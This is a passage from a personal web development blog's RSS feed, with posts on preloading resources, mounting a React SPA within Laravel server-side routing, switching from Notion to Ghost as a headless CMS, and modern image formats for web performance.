Impact&lt;/h2&gt;&lt;p&gt;Here&apos;s what I&apos;m not saying: &quot;There&apos;s literally zero value to preloading anything already being loaded by your HTML.&quot; We&apos;ve seen how that&apos;s not necessarily the case. Instead, here&apos;s the big takeaway: if you&apos;re stopping at preloading HTML-embedded resources, you&apos;re missing out on its real power. &lt;/p&gt;&lt;p&gt;With that in mind, here are two bits of guidance as you dig into your HTML:&lt;/p&gt;&lt;p&gt;First, keep your eyes peeled for resources that later fetch more resources themselves. We&apos;ve seen it with our example CSS above, and some widely known resources out there do it too. For example, Google Fonts asks you to drop a CSS file on a page, which only turns around to request font files. The preload scanner can&apos;t see those in advance, and you should definitely preload things like this.&lt;/p&gt;&lt;p&gt;But JavaScript is another big culprit too. There&apos;s a world of pure, single-page applications out there, and none of them can fetch anything until JavaScript is able to download, parse, and execute. &lt;a href=&quot;https://addyosmani.com/blog/preload-hero-images/?ref=cms.macarthur.me&quot;&gt;Addy Osmani drive this home&lt;/a&gt; really well. In these cases, the preload scanner is completely blind to critical static assets, and declaratively preloading them will yield big gains. &lt;/p&gt;&lt;p&gt;Performance tooling touches on this as well. If you&apos;ve run a Lighthouse report and saw a suggestion to preload an image, you&apos;ve seen this little disclaimer: &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/06/image-14.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;1160&quot; height=&quot;492&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/06/image-14.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/06/image-14.png 1000w, https://cms.macarthur.me/content/images/2023/06/image-14.png 1160w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;Don&apos;t miss it. Preloading is most useful &quot;if the LCP element is dynamically added to the page.&quot; That is, if JavaScript slaps it on the page after the preload scanner&apos;s work is already done.&lt;/p&gt;&lt;p&gt;Second, be aware of what&apos;s &lt;em&gt;not&lt;/em&gt; caught by the preload scanner. In particular, I&apos;m thinking of inlined background images on elements: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;div style=&quot;background-url: url(&apos;https://whatever/image.jpg&apos;);&quot;&amp;gt;
    Some content.
&amp;lt;/div&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Assets like this are handled by the CSS parser, and are therefore out of the preload scanner&apos;s scope. Even if they&apos;re hard-coded into your server-rendered HTML, it&apos;s possibly in your best interest to deliberately preload those images. &lt;/p&gt;&lt;p&gt;Finally, don&apos;t get into the habit of preloading everything. We&apos;ve already established that doing it for some assets really doesn&apos;t buy you much. And if you overdo it, you&apos;ll actually harm performance. As &lt;a href=&quot;https://web.dev/preload-critical-assets/?ref=cms.macarthur.me&quot;&gt;these smart people&lt;/a&gt; put it: &lt;/p&gt;&lt;blockquote&gt;
Preloading too much JavaScript during startup can carry unintended negative consequences if too many resources are contending for bandwidth.
&lt;/blockquote&gt;&lt;p&gt;When used sparingly, however, and for just the right resources, it can be very impactful. Even more so than just prioritized your already-embedded assets.&lt;/p&gt;</content:encoded></item><item><title>Mount a Multi-Page SPA into an App with Server-Side Routing</title><link>https://macarthur.me/posts/combining-client-server-routing</link><guid isPermaLink="true">https://macarthur.me/posts/combining-client-server-routing</guid><pubDate>Fri, 02 Jun 2023 23:50:01 GMT</pubDate><content:encoded>&lt;p&gt;This is one of those posts largely written for later reference by my future self.&lt;/p&gt;&lt;p&gt;I&apos;ve been building a small React application. It has a few routes orchestrated by React Router, but it needed to be mounted onto a path within a Laravel application that uses traditional server-side routing. &lt;/p&gt;&lt;p&gt;Here&apos;s a contrived scenario. Each router – server-side Laravel and client-side React – defines it&apos;s own set of routes, with the latter being mounted onto one route of the former. A similar setup could be seen with another router and framework (Vue, Django, whatever). I just happen to be working with Laravel and React. &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/06/image-2.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;1536&quot; height=&quot;1050&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/06/image-2.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/06/image-2.png 1000w, https://cms.macarthur.me/content/images/2023/06/image-2.png 1536w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;If the React application is &lt;em&gt;always&lt;/em&gt; booted up at the base route (in this case, &lt;code&gt;/spa&lt;/code&gt;), there&apos;s no issue. React Router will completely assume ownership of subsequent navigations entirely on the client. But if the user mades a fresh request to one of these client-side routes directly, Laravel will attempt to resolve it as any other GET request, and it&apos;ll fail. &lt;/p&gt;&lt;p&gt;For example, say we have those routes defined like this, each rendering a specific Blade template:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;Route::get(&apos;/server-rendered-one&apos;, function (Request $request) {
	return view(&apos;one&apos;);
});

Route::get(&apos;/server-rendered-two&apos;, function (Request $request) {
	return view(&apos;two&apos;);
});

Route::get(&apos;/spa&apos;, function (Request $request) {
	return view(&apos;spa&apos;);
});&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here&apos;s what you&apos;ll see by navigating to &lt;code&gt;/spa/client-rendered-two&lt;/code&gt;: &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/06/image-3.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;1688&quot; height=&quot;784&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/06/image-3.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/06/image-3.png 1000w, https://cms.macarthur.me/content/images/size/w1600/2023/06/image-3.png 1600w, https://cms.macarthur.me/content/images/2023/06/image-3.png 1688w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;That makes sense. That route doesn&apos;t exist, so Laravel behaves accordingly.&lt;/p&gt;&lt;p&gt;In order for these breeds of routes to live in harmony, &lt;strong&gt;Laravel needs to surrender all direct requests for a route to the &lt;em&gt;same&lt;/em&gt; HTML&lt;/strong&gt; loading the &lt;em&gt;same&lt;/em&gt; React application, allowing the client-side router to take over with whatever path is shown in the browser. &lt;/p&gt;&lt;h2&gt;Tell React Router Where It&apos;ll Live&lt;/h2&gt;&lt;p&gt;Here are the routes I&apos;ve wired up with React Router. One base route with a couple of others: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;import React from &quot;react&quot;;
import { createRoot } from &quot;react-dom/client&quot;;
import { createBrowserRouter, RouterProvider } from &quot;react-router-dom&quot;;

const router = createBrowserRouter(
    [
        {
            path: &quot;/&quot;,
            element: &amp;lt;&amp;gt;Root page!&amp;lt;/&amp;gt;,
        },
        {
            path: &quot;/client-rendered-two&quot;,
            element: &amp;lt;&amp;gt;Second client-rendered page!&amp;lt;/&amp;gt;,
        },
        {
            path: &quot;/client-rendered-three&quot;,
            element: &amp;lt;&amp;gt;Third client-rendered page!&amp;lt;/&amp;gt;,
        },
    ]
);

const domNode = document.getElementById(&quot;root&quot;);
const root = createRoot(domNode);

root.render(&amp;lt;RouterProvider router={router} /&amp;gt;);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In local development, navigating to &lt;code&gt;/&lt;/code&gt; would expectedly render &quot;Root page!&quot; But in order the router to correctly parse the path while running on a server-rendered &lt;code&gt;/spa&lt;/code&gt; path, I need to React Router know about it using the &lt;a href=&quot;https://reactrouter.com/en/main/routers/create-browser-router?ref=cms.macarthur.me#basename&quot;&gt;&lt;code&gt;basename&lt;/code&gt; option&lt;/a&gt;: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;const router = createBrowserRouter(
	[
		{
			path: &quot;/&quot;,
			element: &amp;lt;&amp;gt;Root page!&amp;lt;/&amp;gt;,
		},
		{
			path: &quot;/client-rendered-two&quot;,
			element: &amp;lt;&amp;gt;Second client-rendered page!&amp;lt;/&amp;gt;,
		},
		{
			path: &quot;/client-rendered-three&quot;,
			element: &amp;lt;&amp;gt;Third client-rendered page!&amp;lt;/&amp;gt;,
		},
    ],
    {
		// Tell RR this app will always mounted at /spa.
		basename: &quot;/spa&quot;, 
    }
);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;With that in place, navigating to &lt;code&gt;/spa/client-rendered-two&lt;/code&gt; will effectively instruct the router to ignore the base &lt;code&gt;/spa&lt;/code&gt;, and to determine which component to rendered using the segments that follow. It&apos;ll also automatically prepend that path onto any client-side navigation that follows. So, we&apos;re good to go with the client-side piece.&lt;/p&gt;&lt;h2&gt;Catch All Path Parameters&lt;/h2&gt;&lt;p&gt;In order to send any &lt;code&gt;/spa/*&lt;/code&gt; request to the same Blade template, we&apos;re gonna have to do some &quot;route globbing,&quot; which can be accomplished with Laravel&apos;s &lt;a href=&quot;https://laravel.com/docs/10.x/routing?ref=cms.macarthur.me#parameters-optional-parameters&quot;&gt;optional parameters&lt;/a&gt;. The trick is to throw a &lt;code&gt;?&lt;/code&gt; after the parameter you&apos;d like to be optional:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;Route::get(&apos;/spa/{whatevs?}&apos;, function (Request $request) {
    return view(&apos;spa&apos;);
});
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;That&apos;ll work for any two-segment paths, but it &lt;em&gt;won&apos;t&lt;/em&gt; work if you were to navigate to &lt;code&gt;/spa/taxation/is/theft&lt;/code&gt;. To get the route to match any &lt;em&gt;any number of segments, &lt;/em&gt;we can use a &lt;a href=&quot;https://laravel.com/docs/10.x/routing?ref=cms.macarthur.me#parameters-optional-parameters&quot;&gt;regular expression constraint&lt;/a&gt;:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;Route::get(&apos;/spa/{whatever?}&apos;, function (Request $request) {
    return view(&apos;spa&apos;);
- });    
+ })-&amp;gt;where(&apos;whatever&apos;, &apos;.*&apos;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This constraint uses the extremely loose &lt;code&gt;.*&lt;/code&gt; pattern to tell Laravel that the &lt;code&gt;whatever&lt;/code&gt; path segment can match &lt;em&gt;any&lt;/em&gt; type of character, even slashes, so we&apos;ll be covered if our React app every introduces deeper, more complex routes. Let&apos;s reload:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/06/image-6.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;1270&quot; height=&quot;282&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/06/image-6.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/06/image-6.png 1000w, https://cms.macarthur.me/content/images/2023/06/image-6.png 1270w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;All set. Laravel is ready to accept any request whose path starts with &lt;code&gt;/spa&lt;/code&gt;, no matter what the rest of the URL looks like. And when it does, it&apos;s React Router&apos;s time to shine.&lt;/p&gt;&lt;h2&gt;Transferrable to Other Frameworks&lt;/h2&gt;&lt;p&gt;Again, there&apos;s nothing conceptually here that limits mounting a client-side router into just Laravel. If you were working in Rails, for example, it&apos;s actually even simpler using a &lt;a href=&quot;https://guides.rubyonrails.org/routing.html?ref=cms.macarthur.me#route-globbing-and-wildcard-segments&quot;&gt;wildcard segment&lt;/a&gt;. Just keep in mind that the parentheses are required – they make the segment optional:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;# config/routes.rb

get &apos;spa/(*whatever)&apos;, to: &apos;spa#index&apos;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And if you were using something like &lt;a href=&quot;https://router.vuejs.org/api/interfaces/RouterHistory.html?ref=cms.macarthur.me#Properties-base&quot;&gt;Vue Router&lt;/a&gt;, you&apos;d then set the &lt;code&gt;base&lt;/code&gt; property for property configuring client-side routing. You get the idea. We&apos;re just dealing with JavaScript and HTTP stuff here. The tools are purely tactical.&lt;/p&gt;&lt;h2&gt;Why Tho&lt;/h2&gt;&lt;p&gt;On the surface, using a pattern like this might feel over-engineered. Maintaining routes for an application can get complex in any single paradigm, and now we&apos;re distributing it over &lt;em&gt;two&lt;/em&gt; – server &lt;em&gt;and&lt;/em&gt; client? In this economy? Nevertheless, I&apos;ve become more open to it as real-life scenarios have come up.&lt;/p&gt;&lt;p&gt;For one, I think it can be useful for &quot;domain&quot; management within a monolith application. This is roughly the situation around the project that prompted this post. The server can choose which server-side routes to expose (maybe one for each domain/part of the application), and allow the the client to then own the routes &lt;em&gt;within&lt;/em&gt; those domains. The entirety of the client-side experience can then be managed somewhat independently from the broader application. &lt;/p&gt;&lt;p&gt;Second, it can be helpful for slowly transitioning a traditional application over to a full client-side architecture. As more and more routing is delegated to the client, the application would manage fewer routes on its own, leaving only those for providing data and handling mutations.&lt;/p&gt;&lt;p&gt;For my own projects, however, I&apos;ve been preferring a different mash of approaches – full server-side routing with a JS-powered front end that interfaces with those routes in a way that makes the application &lt;em&gt;feel&lt;/em&gt; like a full-blown SPA. It&apos;s been popularized by Inertia.js the past few years, and I&apos;m using it to run &lt;a href=&quot;https://jamcomments.com/?ref=cms.macarthur.me&quot;&gt;JamComments&lt;/a&gt; with immense satisfaction. &lt;/p&gt;&lt;p&gt;At any rate, it&apos;s been rewarding to explore these varying models for routing, and I&apos;m eager to see which ones lay the strongest claim for different use cases as time goes on.&lt;/p&gt;</content:encoded></item><item><title>Why I Moved from Notion to Ghost for My Headless CMS</title><link>https://macarthur.me/posts/ghost-as-headless-cms</link><guid isPermaLink="true">https://macarthur.me/posts/ghost-as-headless-cms</guid><pubDate>Thu, 25 May 2023 03:27:54 GMT</pubDate><content:encoded>&lt;p&gt;I&apos;ve been dogfooding &lt;a href=&quot;https://jamcomments.com/?ref=cms.macarthur.me&quot;&gt;JamComments&lt;/a&gt; as I iterate on it, and as a part of that effort, I&apos;ve committed to blogging a little more regularly. It works out because I like doing both of those things. &lt;/p&gt;&lt;p&gt;Along the way, I also decided to move away from using flat Markdown files for blog posts. I wanted something a little friendlier for &quot;on-the-go&quot; writing, and it was becoming a little too cumbersome to manage the publishing process via Git repository (there are solutions to this, but I&apos;m not totally sold on any of them).&lt;/p&gt;&lt;p&gt;I like the authoring experience of Notion, and was intrigued by its relatively new API, so I took the plunge and decided to upgrade this statically rendered site with Notion as its CMS.&lt;/p&gt;&lt;p&gt;That transition was fine until until things started to hurt. Quickly enough, I began to realize Notion might not be the best platform on which to further scale this sort of content. In the end, I chose to make another switch – this time, to the open source version of &lt;a href=&quot;https://ghost.org/?ref=cms.macarthur.me&quot;&gt;Ghost&lt;/a&gt;. I&apos;ll break it all down a bit in the form of several numbered lists. &lt;/p&gt;&lt;h2&gt;Issues w/ Notion&lt;/h2&gt;&lt;p&gt;Notion&apos;s writing experience is very good, but in terms of using it as a headless CMS, there were a few key things I didn&apos;t want to tolerate anymore. &lt;/p&gt;&lt;p&gt;&lt;strong&gt;#1. Build times were slow.&lt;/strong&gt; Last I checked, Notion&apos;s API doesn&apos;t support fetching all of a page&apos;s content at once. Instead, you&apos;re required to fetch a page&apos;s individual blocks and stitch the content together. That makes for a &lt;em&gt;lot&lt;/em&gt; of API requests and a lengthy build, compromising not only the development experience, but also the update process. Making the slightest tweak to a single post meant waiting for another wrinkle on my face to surface and a gray hair to sprout.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;#2. &lt;a href=&quot;https://developers.notion.com/reference/request-limits?ref=cms.macarthur.me&quot;&gt;API limits&lt;/a&gt; were frustrating.&lt;/strong&gt; The fact that API limits exist isn&apos;t a problem, but it sure becomes a bear when you need to spend a &lt;em&gt;lot&lt;/em&gt; of requests building a single page (see the previous point). I&apos;d commonly find myself blocked from making more requests (especially during development), and would need to wait a few minutes to get going again. Technically, there are ways around it (the response will let you know how long you need to wait via &lt;code&gt;Retry-After&lt;/code&gt; header), but doing so only further exacerbates the &quot;slow build time&quot; problem. &lt;/p&gt;&lt;p&gt;To avoid hitting limits in local development, I set up a local caching mechanism using &lt;a href=&quot;https://github.com/typicode/lowdb?ref=cms.macarthur.me&quot;&gt;lowdb&lt;/a&gt;. It did the job, but it always felt like more complexity than I should need to manage for a personal blog, and I occassionally became annoyed when I needed to remember to blow away that cache when I wanted to see freshest content.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;#3. It&apos;s &lt;em&gt;too&lt;/em&gt; easy to publish.&lt;/strong&gt; There&apos;s no dedicated &quot;save&quot; or &quot;publish&quot; feature in Notion. When you make a change, it&apos;s &quot;stuck,&quot; and totally eligible to be taken up with the next build of my site. I was constantly worried about accidentally tweaking the content, and later discovering I had butt-typed and sent an unwelcome change to my production site. &lt;/p&gt;&lt;p&gt;&lt;strong&gt;#4. Handling images was too complicated. &lt;/strong&gt;I was initially excited about the fact that Notion&apos;s image URLs expire after some time and how I&apos;d need to engineer some solution to make them more/less permanent. It was fun -- I used Cloudflare Workers and R2 to pull it off and even &lt;a href=&quot;https://www.macarthur.me/posts/serving-notion-presigned-images-with-cloudflare?ref=cms.macarthur.me&quot;&gt;wrote a post about it&lt;/a&gt;. But in hindsight, it became another level of complexity I didn&apos;t really want to maintain or deal with later on. Plus, it contributed to the long build times.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;#5. I want webhooks.&lt;/strong&gt; At the time of writing, Notion doesn&apos;t offer any webhooks that fire when content is updated. I would have loved to use this for rebuilding my site whenever a post was added, updated, or deleted. Instead, I needed to rely on manually triggering a build myself as needed; or waiting for &lt;a href=&quot;https://github.com/alexmacarthur/macarthur-me-astro/blob/master/.github/workflows/rebuild.yml?ref=cms.macarthur.me&quot;&gt;the cron job&lt;/a&gt; I have set up to rebuild after some time. &lt;a href=&quot;https://www.reddit.com/r/Notion/comments/nd76ec/notion_api_webhooks/?ref=cms.macarthur.me&quot;&gt;I&apos;ve seen people get creative&lt;/a&gt; to solve for this, but I wasn&apos;t willing to take on that challenge.&lt;/p&gt;&lt;h2&gt;Searching for a Headless Option&lt;/h2&gt;&lt;p&gt;I&apos;m cheap and &lt;a href=&quot;https://www.macarthur.me/posts/boarded-the-ssg-train-again?ref=cms.macarthur.me&quot;&gt;I really like my static site&lt;/a&gt;, so I knew moving from Notion would mean looking for good, affordable (free), headless options. WordPress was a top contender. I have a solid amount of experience with the platform and felt I could knock it out pretty quickly. But a few things deterred me from taking that path. Another list:&lt;/p&gt;&lt;p&gt;&lt;strong&gt;#1. Self-hosted WordPress doesn&apos;t support Markdown out of the box.&lt;/strong&gt; I&apos;d need to research, vet, and install a separate plugin. I just didn&apos;t wanna deal. &lt;/p&gt;&lt;p&gt;&lt;strong&gt;#2. There&apos;s no built-in membership/newsletter support.&lt;/strong&gt; I&apos;d need to yet again go through the plugin vetting process, or else stick with something like Mailchimp, which I didn&apos;t love. &lt;/p&gt;&lt;p&gt;&lt;strong&gt;#3. I&apos;m a little burned out on WordPress. &lt;/strong&gt;There&apos;s nothing very tangible to this one. I just wanted something that I felt was a little more... focused, cruft-less, and removed from that ecosystem. &lt;/p&gt;&lt;h2&gt;Then Ghost Came Along&lt;/h2&gt;&lt;p&gt;I&apos;ve known about Ghost for several years and while I&apos;ve always liked the vibe it emits, I had never tried it. But when I did, I was impressed. List time:&lt;/p&gt;&lt;p&gt;&lt;strong&gt;#1. The writing experience is slickkk. &lt;/strong&gt;This is the thing that first got me hooked. The UI is modern, simple, clean, and intuitive. It supports Markdown-like syntax out of the box too, which made it real easy to get acclimated. I also got all of the blog goodies I previously took for granted (drafts, tags, featured images, etc.) – things I needed to cobble together with various fields in Notion. And there&apos;s also a dedicated &quot;publish&quot; button baked into the platform.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;#2. The REST API is fast and free of limits.&lt;/strong&gt; It also comes with JavaScript SDKs for both pulling content and managing admin-related things. I had no issues and was blown away by the results, especially coming from what I had become used to (no more stiching pages together with multipme requests!). Look at the build time difference my Notion-powered and Ghost-powered sites: &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/05/image.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;990&quot; height=&quot;372&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/05/image.png 600w, https://cms.macarthur.me/content/images/2023/05/image.png 990w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;Keep in mind that the &quot;slow&quot; approach involved both pulling content from the API, as well as the fancy image handling I was doing with Cloudflare. Still, that&apos;s like nine times faster, and I get to shed a whole lot of complexity along the way. It was an easy sell. &lt;/p&gt;&lt;p&gt;&lt;strong&gt;#3. It comes with built-in newsletter/subscription support. &lt;/strong&gt;To be honest, managing a newsletter and subscribers wasn’t even on my radar when I initially started looking at Ghost. But then I started to explore the feature and discover just how respected it is in the content world (many have migrated to it as an alternative to Substack). Mailchimp had always felt a little heavy-handed for me, and I liked the idea of managing both my content and subscribers in a single place. And once I toyed around with membership features of the REST API, it became pretty clear this was a serious alternative to what I had been using.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;#4. It&apos;s got webhooks.&lt;/strong&gt; And good ones! I can easily fine-tune when a new build is triggered, which is nice because it means it&apos;s not triggered whenever a meaningless event takes place (like when a draft is updated, for example). Here&apos;s a view into the hooks I have set up as of writing: &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/05/image-9.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;1110&quot; height=&quot;728&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/05/image-9.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/05/image-9.png 1000w, https://cms.macarthur.me/content/images/2023/05/image-9.png 1110w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;In all, it takes away all of the complexities I was getting sick of dealing with, and leaves me with features I actually care about.&lt;/p&gt;&lt;h2&gt;Here&apos;s a First&lt;/h2&gt;&lt;p&gt;Usually, soon after making a pretty large shift like this, I start feeling a hint of malaise over how it&apos;s all put together. It&apos;s the curse of any developer – soon enough, it becomes incessant enough to knock it all down and rebuild it with a different foundation.&lt;/p&gt;&lt;p&gt;But this time feels different. My current stack provides pretty much everything I&apos;ve consistently wanted. Astro gives me a performant static site with a great developer experience (&lt;a href=&quot;https://www.macarthur.me/posts/what-i-like-about-astro?ref=cms.macarthur.me&quot;&gt;I&apos;ve written about this&lt;/a&gt;). Plausible gives lightweight, privacy-minded analytics (&lt;a href=&quot;https://www.macarthur.me/posts/moving-from-google-analytics-to-plausible?ref=cms.macarthur.me&quot;&gt;this too&lt;/a&gt;). And now Ghost gives me a hassle-free CMS that I really enjoy using (refresh the page to see what I&apos;ve written about this). &lt;/p&gt;&lt;p&gt;I think I&apos;ll be leaving things where they&apos;re at for a while.&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</content:encoded></item><item><title>Why Your Website Should Use Modern Image Formats</title><link>https://macarthur.me/posts/image-formats-matter</link><guid isPermaLink="true">https://macarthur.me/posts/image-formats-matter</guid><pubDate>Tue, 02 May 2023 02:45:00 GMT</pubDate><content:encoded>&lt;p&gt;For years now, Google and other search engines have made it quite clear that &lt;a href=&quot;https://developers.google.com/search/blog/2020/11/timing-for-page-experience?ref=cms.macarthur.me&quot;&gt;page performance matters&lt;/a&gt; in how websites rank in search results. As a part of that effort to improve digital experiences, Google introduced its &lt;a href=&quot;https://web.dev/vitals/?ref=cms.macarthur.me&quot;&gt;Core Web Vitals&lt;/a&gt; -- a set of specific, real-world metrics site owners can use to monitor and improve the performance of their pages over time.&lt;/p&gt;&lt;h2&gt;How Images Impact Core Web Vitals&lt;/h2&gt;&lt;p&gt;Often being the largest asset on a page, how you format your images are critical to the health of these metrics. Three of them are particularly sensitive to your site&apos;s images:&lt;/p&gt;&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://web.dev/lcp/?ref=cms.macarthur.me&quot;&gt;Largest Contentful Paint (LCP)&lt;/a&gt;&lt;/strong&gt; measures how long it takes for the biggest chunk of content to be visible to the user&apos;s viewport. Using heavy, antiquated images forces the user to wait longer for that content to become rendered, compromising page experience.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://web.dev/cls/?ref=cms.macarthur.me&quot;&gt;Cumulative Layout Shift (CLS)&lt;/a&gt;&lt;/strong&gt; is concerned with how much &quot;jank&quot;, or unexpected layout shift occurs when a page is visited. Especially if you&apos;re not &lt;a href=&quot;https://www.smashingmagazine.com/2020/03/setting-height-width-images-important-again/?ref=cms.macarthur.me&quot;&gt;setting dimension attributes on your images&lt;/a&gt;, poorly-optimized images can lengthen the amount of time it takes for a page to become &quot;settled,&quot; worsening metrics like CLS.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://web.dev/inp/?ref=cms.macarthur.me&quot;&gt;Interaction to Next Paint (INP)&lt;/a&gt;&lt;/strong&gt; all about how long it takes for your page to respond to any user action (a click, scroll, form submission -- anything). Responding to these actions firmly depends on the browser&apos;s main thread having the bandwidth to do the work and communicate over the network if needed. All of that&apos;s made more difficult when large images being downloaded over long periods of time, hogging CPU resources and network capacity.&lt;/p&gt;&lt;h2&gt;What Formatting Matters&lt;/h2&gt;&lt;p&gt;There are some obvious things you can do to improve image performance -- like keep them at appropriate sizes and exporting them at an appropriate quality. But more specifically, choosing the right &lt;em&gt;format&lt;/em&gt; can have a larger impact than you might think. Thankfully, modern browsers have been rolling out support for modern formats that significantly reduce image size, while supporting features like transparent backgrounds and GIF-like animations. Three of them are the most notable.&lt;/p&gt;&lt;h2&gt;What is WebP?&lt;/h2&gt;&lt;p&gt;WebP was first introduced by Google &lt;a href=&quot;https://encyclopedia.pub/entry/31288?ref=cms.macarthur.me#:~:text=1.-,History,files%20for%20comparable%20image%20quality.&quot;&gt;back in 2010&lt;/a&gt;, and it&apos;s since seen &lt;a href=&quot;https://caniuse.com/webp?ref=cms.macarthur.me&quot;&gt;extremely good support across all major browsers&lt;/a&gt;. It&apos;s so good, in fact, that many websites now use it as the default target format for their images.&lt;/p&gt;&lt;p&gt;The benefits to treating WebP are many. The format was specifically engineered for the web, offering lossless and lossy compression, and offer notable savings in file size compared to more traditional formats. It will greatly depend on the image, the original format, but your average lossless conversion &lt;a href=&quot;https://developers.google.com/speed/webp?ref=cms.macarthur.me&quot;&gt;saves around ~30% in file size&lt;/a&gt; on average. And if you go with a lossy transformation that&apos;s usually indistinquishable, those savings can get as high as 70%.&lt;/p&gt;&lt;h2&gt;What is AVIF?&lt;/h2&gt;&lt;p&gt;The AVIF format is newer to the scene, but offers some exciting results in image optimization. It&apos;s based on the AV1 video codec and was introduced in 2019. Depending on the image, it can offer even greater savings than the WebP version of an image, and &lt;a href=&quot;https://www.smashingmagazine.com/2021/09/modern-image-formats-avif-webp/?ref=cms.macarthur.me#avif&quot;&gt;also supports animated images&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;The downside to the AVIF format, however, is its browser support. It&apos;s &lt;em&gt;good&lt;/em&gt;, &lt;a href=&quot;https://caniuse.com/avif?ref=cms.macarthur.me&quot;&gt;but not &lt;em&gt;great&lt;/em&gt;&lt;/a&gt;, which may bring hesitancy in some website owners looking to use it on their sites. Even so, using tools like the HTML element, which allow you to set a fallback strategy for image formats, or just by analyzing your traffic patterns, it may be worth considering.&lt;/p&gt;&lt;h2&gt;What is JPEG XL?&lt;/h2&gt;&lt;p&gt;By far, JPEG XL offers the least &lt;a href=&quot;https://caniuse.com/jpegxl?ref=cms.macarthur.me&quot;&gt;limited browser support&lt;/a&gt; (it&apos;s basically nothing), but is still causing quite the excitement among industry professionals. The format was officially standardized &lt;a href=&quot;https://en.wikipedia.org/wiki/JPEG_XL?ref=cms.macarthur.me&quot;&gt;back in 2021&lt;/a&gt;, and aims to become the &lt;a href=&quot;https://jpegxl.io/articles/faq/?ref=cms.macarthur.me#whatisajpegxlfile?&quot;&gt;universal replacement for raster graphics&lt;/a&gt; in the coming years. Unlike WebP and AVIF, it was designed from the ground-up with &quot;image architecture&quot; in mind. It&apos;s not a spin-off for any sort of video format.&lt;/p&gt;&lt;p&gt;JPEG XL is a format championing efficiency and backward-compability. It touts progressive decoding options (allowing you to do things like begin to render a partially downloaded image), and it can still be easily converted into its JPEG counterpart. While it&apos;s not ready for the mainstream web yet, JPEG XL could have a large influence in the overall efficiency of downloading, decoding, and rendering high-quality images on the web.&lt;/p&gt;&lt;h2&gt;Where Do I Start?&lt;/h2&gt;&lt;p&gt;It&apos;s not possible to snap your fingers and reformat every image on your website. But there some specific steps you can take to improve your image performance more generally.&lt;/p&gt;&lt;h3&gt;1. Measure your overall page performance.&lt;/h3&gt;&lt;p&gt;Use tools like &lt;a href=&quot;https://pagespeed.web.dev/?ref=cms.macarthur.me&quot;&gt;PageSpeed Insights&lt;/a&gt; or WebPageTest.org(&lt;a href=&quot;https://www.webpagetest.org/?ref=cms.macarthur.me&quot;&gt;https://www.webpagetest.org/&lt;/a&gt;) to begin collecting data on how your site&apos;s performing, including how serious image performance is for your site. Having data in hand is critical to prioritizing strategies and making a plan.&lt;/p&gt;&lt;h3&gt;2. Lazy load where you can.&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://web.dev/browser-level-image-lazy-loading/?ref=cms.macarthur.me&quot;&gt;Lazy loading is natively supported&lt;/a&gt; in all major browers, and can be activated simply by adding a &quot;loading=&apos;lazy&apos;&quot; attribute to your images. Doing this will defer image downloads until they&apos;re absolutely necessary, reducing network contention and the amount of raw data a user is required to download to experience your website. Just make sure you do it only for images not seen on a page when it&apos;s first loaded.&lt;/p&gt;&lt;h3&gt;3. See how much a modern image format could save you.&lt;/h3&gt;&lt;p&gt;If image size or format is called out on the performance reports you run, see what kind of savings you could get by reformatting your images with &lt;a href=&quot;https://www.picperf.io/analyze?ref=cms.macarthur.me&quot;&gt;PicPerf&apos;s analysis tool&lt;/a&gt;. It&apos;ll crawl your site and generate a report on how much overall page weight you could cut simply by optimizing your images, as well as 